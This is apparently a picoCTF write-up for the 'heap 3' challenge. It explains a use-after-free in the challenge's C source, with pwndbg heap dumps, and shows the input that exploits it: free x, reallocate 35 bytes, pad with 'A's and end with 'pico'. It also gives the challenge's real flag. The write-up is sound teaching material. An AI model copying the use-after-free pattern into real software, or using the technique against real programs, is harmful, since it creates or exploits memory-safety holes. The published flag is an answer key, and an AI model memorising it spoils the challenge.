# heap 3 (200 points)
This program mishandles memory. Can you exploit it to get the flag?

Download the binary [here]().

Download the source [here]().

Connect with the challenge instance here: `nc tethys.picoctf.net 57658`

## Data
* chall
* chall.c

## Solution
We got the following source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}
```

The functionality of the program is the same like before. But this time it allocates a global variable `x` as a struct called `object`:
```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```

Via the corresponding option we can free the variable `x`. With another option we can allocate new heap memory with `malloc` in the size that we want and with the content we would like to store.

At this point we have to understand a bit the functionality of malloc-free in C under Linux. Malloc and free manage the free-list. This is a linked list with free memory chunks in the heap. If we now allocate memory with malloc, the list will be checked and the first free chunk that fits to size that we want to allocate, will be used (first-fit). The chunk is then removed from the free-list. If we free memory, the chunk will be added again into the free list and the memory is available again. But the data stays in its place and will not be overridden. So with the pointer to the allocated memory, we can still access the location and the data. But it can be reused with the next malloc call.

This is the theory that we can abuse in this challenge. We free the memory of `x`. In the next step we allocate memory in the same size (`struct object` with 35 bytes). The first-fit algorithm gets us the same chunk from the free-list as before. So we have a new variable that points to the remaining data of the freed `x`, because it wasn't overridden.

The function `check_win()` checks the pointer from `x->flag` for its value. This still references to the freed value. With our new allocated variable, we can write to this memory location.

If we call this precedure in the program we get our test flag:
```
$ ./chall

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{testflag}

$
```

With the gdb plugin `pwndbg` we can list the heap and see a part of the malloc-free process in action.

This is the heap after the initialization and the malloc of `x`:
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x4056a0
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x4056d0
Size: 0x20930 (with flag bits: 0x20931)

pwndbg>
```
The third chunk is the allocated memory. The size is 48 bytes and not 35. This is becuase the free-list also uses a header before every chunk with information about its size and the next free chunk.

If we free `x`, we can see that the chunk is marked as `Free chunk`:
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x410 (with flag bits: 0x411)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x4056a0
Size: 0x30 (with flag bits: 0x31)
fd: 0x405

Allocated chunk | PREV_INUSE
Addr: 0x4056d0
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x405ae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg>
```

And in the last step we allocate some memory with the same size and it's an `Allocated chunk` again:
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x4056a0
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x4056d0
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x405ae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg>
```

If we run this now on the server we get our actual flag:
```
$ nc tethys.picoctf.net 57658

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{now_thats_free_real_estate_c1e14587}
```
